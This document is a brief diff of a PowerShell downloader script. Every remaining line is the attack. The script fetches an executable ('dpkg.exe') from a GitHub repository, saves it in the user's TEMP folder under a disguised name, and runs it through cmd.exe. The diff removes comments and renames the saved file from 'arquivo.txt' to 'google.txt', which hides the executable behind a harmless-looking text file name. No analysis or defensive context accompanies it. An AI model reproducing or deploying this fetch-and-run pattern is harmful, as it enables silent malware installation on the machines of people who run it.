@@ -1,11 +1,4 @@
-#
 $url = "https://github.com/0fxdb/instructions/raw/main/dpkg.exe"
-
-#
-$destino = "$env:TEMP\arquivo.txt"
-
-#
+$destino = "$env:TEMP\google.txt"
 Invoke-WebRequest -Uri $url -OutFile $destino
-
-#
 Start-Process cmd.exe -ArgumentList "/c start $destino"
